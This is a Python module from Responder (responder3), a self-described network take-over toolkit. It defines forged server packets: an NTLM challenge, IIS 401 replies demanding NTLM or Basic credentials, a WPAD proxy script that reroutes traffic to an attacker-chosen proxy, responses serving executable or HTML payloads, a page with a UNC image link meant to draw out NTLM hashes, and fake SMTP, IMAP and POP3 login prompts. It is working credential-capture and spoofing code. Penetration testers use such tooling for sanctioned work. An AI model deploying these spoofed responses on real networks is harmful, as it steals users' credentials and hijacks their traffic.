#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from responder3.utils import *
from base64 import b64decode, b64encode
from responder3.odict import OrderedDict

# Packet class handling all packet generation (see odict.py).
class Packet():
	fields = OrderedDict([
		("data", ""),
	])
	def __init__(self, **kw):
		self.fields = OrderedDict(self.__class__.fields)
		for k,v in kw.items():
			if callable(v):
				self.fields[k] = v(self.fields[k])
			else:
				self.fields[k] = v
	def __str__(self):
		return "".join(map(str, self.fields.values()))

	def getdata(self):
		return b"".join(self.fields.values())

##### FTP Packets #####
class FTPPacket(Packet):
	fields = OrderedDict([
		("Code",           b"220"),
		("Separator",      b"\x20"),
		("Message",        b"Welcome"),
		("Terminator",     b"\x0d\x0a"),
	])

##### HTTP Packets #####
class NTLM_Challenge(Packet):
	fields = OrderedDict([
		("Signature",        b"NTLMSSP"),
		("SignatureNull",    b"\x00"),
		("MessageType",      b"\x02\x00\x00\x00"),
		("TargetNameLen",    b"\x06\x00"),
		("TargetNameMaxLen", b"\x06\x00"),
		("TargetNameOffset", b"\x38\x00\x00\x00"),
		("NegoFlags",        b"\x05\x02\x89\xa2"),
		("ServerChallenge",  b""),
		("Reserved",         b"\x00\x00\x00\x00\x00\x00\x00\x00"),
		("TargetInfoLen",    b"\x7e\x00"),
		("TargetInfoMaxLen", b"\x7e\x00"),
		("TargetInfoOffset", b"\x3e\x00\x00\x00"),
		("NTLMOsVersion",    b"\x05\x02\xce\x0e\x00\x00\x00\x0f"),
		("TargetNameStr",    "SMB".encode('utf-16')),
		("Av1",              b"\x02\x00"),#nbt name
		("Av1Len",           b"\x06\x00"),
		("Av1Str",           "SMB".encode('utf-16')),
		("Av2",              b"\x01\x00"),#Server name
		("Av2Len",           b"\x14\x00"),
		("Av2Str",           "SMB-TOOLKIT".encode('utf-16')),
		("Av3",              b"\x04\x00"),#Full Domain name
		("Av3Len",           b"\x12\x00"),
		("Av3Str",           "smb.local".encode('utf-16')),
		("Av4",              b"\x03\x00"),#Full machine domain name
		("Av4Len",           b"\x28\x00"),
		("Av4Str",           "server2003.smb.local".encode('utf-16')),
		("Av5",              b"\x05\x00"),#Domain Forest Name
		("Av5Len",           b"\x12\x00"),
		("Av5Str",           "smb.local".encode('utf-16')),
		("Av6",              b"\x00\x00"),#AvPairs Terminator
		("Av6Len",           b"\x00\x00"),
	])

	def calculate(self):
		# First convert to unicode
		self.fields["TargetNameStr"] = self.fields["TargetNameStr"]
		self.fields["Av1Str"] = self.fields["Av1Str"]
		self.fields["Av2Str"] = self.fields["Av2Str"]
		self.fields["Av3Str"] = self.fields["Av3Str"]
		self.fields["Av4Str"] = self.fields["Av4Str"]
		self.fields["Av5Str"] = self.fields["Av5Str"]

		# Then calculate
		CalculateNameOffset = self.fields["Signature"]+self.fields["SignatureNull"]+self.fields["MessageType"]+self.fields["TargetNameLen"]+self.fields["TargetNameMaxLen"]+self.fields["TargetNameOffset"]+self.fields["NegoFlags"]+self.fields["ServerChallenge"]+self.fields["Reserved"]+self.fields["TargetInfoLen"]+self.fields["TargetInfoMaxLen"]+self.fields["TargetInfoOffset"]+self.fields["NTLMOsVersion"]
		CalculateAvPairsOffset = CalculateNameOffset+self.fields["TargetNameStr"]
		CalculateAvPairsLen = self.fields["Av1"]+self.fields["Av1Len"]+self.fields["Av1Str"]+self.fields["Av2"]+self.fields["Av2Len"]+self.fields["Av2Str"]+self.fields["Av3"]+self.fields["Av3Len"]+self.fields["Av3Str"]+self.fields["Av4"]+self.fields["Av4Len"]+self.fields["Av4Str"]+self.fields["Av5"]+self.fields["Av5Len"]+self.fields["Av5Str"]+self.fields["Av6"]+self.fields["Av6Len"]

		# Target Name Offsets
		self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
		self.fields["TargetNameLen"]    = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
		self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
		# AvPairs Offsets
		self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
		self.fields["TargetInfoLen"]    = struct.pack("<i", len(CalculateAvPairsLen))[:2]
		self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
		# AvPairs StrLen
		self.fields["Av1Len"] = struct.pack("<i", len(self.fields["Av1Str"]))[:2]
		self.fields["Av2Len"] = struct.pack("<i", len(self.fields["Av2Str"]))[:2]
		self.fields["Av3Len"] = struct.pack("<i", len(self.fields["Av3Str"]))[:2]
		self.fields["Av4Len"] = struct.pack("<i", len(self.fields["Av4Str"]))[:2]
		self.fields["Av5Len"] = struct.pack("<i", len(self.fields["Av5Str"]))[:2]


class IIS_Auth_401_Ans(Packet):
	fields = OrderedDict([
		("Code",          b"HTTP/1.1 401 Unauthorized\r\n"),
		("ServerType",    b"Server: Microsoft-IIS/7.5\r\n"),
		("Date",          b"Date: "+HTTPCurrentDate()+b"\r\n"),
		("Type",          b"Content-Type: text/html\r\n"),
		("WWW-Auth",      b"WWW-Authenticate: NTLM\r\n"),
		("Len",           b"Content-Length: 0\r\n"),
		("CRLF",          b"\r\n"),
	])

class IIS_Auth_Granted(Packet):
	fields = OrderedDict([
		("Code",          b"HTTP/1.1 200 OK\r\n"),
		("ServerType",    b"Server: Microsoft-IIS/7.5\r\n"),
		("Date",          b"Date: "+HTTPCurrentDate()+b"\r\n"),
		("Type",          b"Content-Type: text/html\r\n"),
		("WWW-Auth",      b"WWW-Authenticate: NTLM\r\n"),
		("ContentLen",    b"Content-Length: "),
		("ActualLen",     b"76"),
		("CRLF",          b"\r\n\r\n"),
		("Payload",       b"<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
	])
	def calculate(self):
		self.fields["ActualLen"] = str(len(self.fields["Payload"])).encode()

class IIS_NTLM_Challenge_Ans(Packet):
	fields = OrderedDict([
		("Code",          b"HTTP/1.1 401 Unauthorized\r\n"),
		("ServerType",    b"Server: Microsoft-IIS/7.5\r\n"),
		("Date",          b"Date: "+HTTPCurrentDate()+b"\r\n"),
		("Type",          b"Content-Type: text/html\r\n"),
		("WWWAuth",       b"WWW-Authenticate: NTLM "),
		("Payload",       b""),
		("Payload-CRLF",  b"\r\n"),
		("Len",           b"Content-Length: 0\r\n"),
		("CRLF",          b"\r\n"),
	])

	def calculate(self,payload):
		self.fields["Payload"] = b64encode(payload)

class IIS_Basic_401_Ans(Packet):
	fields = OrderedDict([
		("Code",          b"HTTP/1.1 401 Unauthorized\r\n"),
		("ServerType",    b"Server: Microsoft-IIS/7.5\r\n"),
		("Date",          b"Date: "+HTTPCurrentDate()+b"\r\n"),
		("Type",          b"Content-Type: text/html\r\n"),
		("WWW-Auth",      b"WWW-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
		("AllowOrigin",   b"Access-Control-Allow-Origin: *\r\n"),
		("AllowCreds",    b"Access-Control-Allow-Credentials: true\r\n"),
		("Len",           b"Content-Length: 0\r\n"),
		("CRLF",          b"\r\n"),
	])


##### WEB Dav Stuff #####
class WEBDAV_Options_Answer(Packet):
	fields = OrderedDict([
		("Code",          b"HTTP/1.1 200 OK\r\n"),
		("Date",          b"Date: "+HTTPCurrentDate()+b"\r\n"),
		("ServerType",    b"Server: Microsoft-IIS/7.5\r\n"),
		("Allow",         b"Allow: GET,HEAD,POST,OPTIONS,TRACE\r\n"),
		("Len",           b"Content-Length: 0\r\n"),
		("Keep-Alive:",   b"Keep-Alive: timeout=5, max=100\r\n"),
		("Connection",    b"Connection: Keep-Alive\r\n"),
		("Content-Type",  b"Content-Type: text/html\r\n"),
		("CRLF",          b"\r\n"),
	])

##### Proxy mode Packets #####
class WPADScript(Packet):
	fields = OrderedDict([
		("Code",          b"HTTP/1.1 200 OK\r\n"),
		("ServerTlype",   b"Server: Microsoft-IIS/7.5\r\n"),
		("Date",          b"Date: "+HTTPCurrentDate()+b"\r\n"),
		("Type",          b"Content-Type: application/x-ns-proxy-autoconfig\r\n"),
		("ContentLen",    b"Content-Length: "),
		("ActualLen",     b"76"),
		("CRLF",          b"\r\n\r\n"),
		("Payload",       b"function FindProxyForURL(url, host){return 'PROXY wpadwpadwpad:3141; DIRECT';}"),
	])
	def calculate(self):
		self.fields["ActualLen"] = str(len(self.fields["Payload"])).encode()

class ServeExeFile(Packet):
	fields = OrderedDict([
		("Code",          b"HTTP/1.1 200 OK\r\n"),
		("ContentType",   b"Content-Type: application/octet-stream\r\n"),
		("LastModified",  b"Last-Modified: "+HTTPCurrentDate()+b"\r\n"),
		("AcceptRanges",  b"Accept-Ranges: bytes\r\n"),
		("Server",        b"Server: Microsoft-IIS/7.5\r\n"),
		("ContentDisp",   b"Content-Disposition: attachment; filename="),
		("ContentDiFile", b""),
		("FileCRLF",      b";\r\n"),
		("ContentLen",    b"Content-Length: "),
		("ActualLen",     b"76"),
		("Date",          b"\r\nDate: "+HTTPCurrentDate()+b"\r\n"),
		("Connection",    b"Connection: keep-alive\r\n"),
		("X-CCC",         b"US\r\n"),
		("X-CID",         b"2\r\n"),
		("CRLF",          b"\r\n"),
		("Payload",       b"jj"),
	])
	def calculate(self):
		self.fields["ActualLen"] = str(len(self.fields["Payload"])).encode()

class ServeHtmlFile(Packet):
	fields = OrderedDict([
		("Code",          b"HTTP/1.1 200 OK\r\n"),
		("ContentType",   b"Content-Type: text/html\r\n"),
		("LastModified",  b"Last-Modified: "+HTTPCurrentDate()+b"\r\n"),
		("AcceptRanges",  b"Accept-Ranges: bytes\r\n"),
		("Server",        b"Server: Microsoft-IIS/7.5\r\n"),
		("ContentLen",    b"Content-Length: "),
		("ActualLen",     b"76"),
		("Date",          b"\r\nDate: "+HTTPCurrentDate()+b"\r\n"),
		("Connection",    b"Connection: keep-alive\r\n"),
		("CRLF",          b"\r\n"),
		("Payload",       b"jj"),
	])
	def calculate(self):
		self.fields["ActualLen"] = str(len(self.fields["Payload"])).encode()

##### SMTP Packets #####
class SMTPauthfail(Packet):
	fields = OrderedDict([
		("Code",       b"221"),
		("Separator",  b"\x20"),
		("Message",    b"smtp01.local ESMTP"),
		("Separator",  b"\x20"),
		("Message",    b"Service closing transmission channel"),
		("Separator",  b"\x20"),
		("Message",    b"Closing transmission"),
		("Separator",  b"\x20"),
		("Message",    b"Goodbye"),
		("CRLF",       b"\x0d\x0a"),
	])

class SMTPGreeting(Packet):
	fields = OrderedDict([
		("Code",       b"220"),
		("Separator",  b"\x20"),
		("Message",    b"smtp01.local ESMTP"),
		("CRLF",       b"\x0d\x0a"),
	])

class SMTPAUTH(Packet):
	fields = OrderedDict([
		("Code0",      b"250"),
		("Separator0", b"\x2d"),
		("Message0",   b"smtp01.local"),
		("CRLF0",      b"\x0d\x0a"),
		("Code",       b"250"),
		("Separator",  b"\x20"),
		("Message",    b"AUTH LOGIN PLAIN XYMCOOKIE"),
		("CRLF",       b"\x0d\x0a"),
	])

class SMTPAUTH1(Packet):
	fields = OrderedDict([
		("Code",       b"334"),
		("Separator",  b"\x20"),
		("Message",    b"VXNlcm5hbWU6"),#Username
		("CRLF",       b"\x0d\x0a"),

	])

class SMTPAUTH2(Packet):
	fields = OrderedDict([
		("Code",       b"334"),
		("Separator",  b"\x20"),
		("Message",    b"UGFzc3dvcmQ6"),#Password
		("CRLF",       b"\x0d\x0a"),
	])

##### IMAP Packets #####
class IMAPGreeting(Packet):
	fields = OrderedDict([
		("Code",     b"* OK IMAP4 service is ready."),
		("CRLF",     b"\r\n"),
	])

class IMAPCapability(Packet):
	fields = OrderedDict([
		("Code",     b"* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN"),
		("CRLF",     b"\r\n"),
	])

class IMAPCapabilityEnd(Packet):
	fields = OrderedDict([
		("Tag",     b""),
		("Message", b" OK CAPABILITY completed."),
		("CRLF",    b"\r\n"),
	])

##### POP3 Packets #####
class POPOKPacket(Packet):
	fields = OrderedDict([
		("Code",  b"+OK"),
		("CRLF",  b"\r\n"),
	])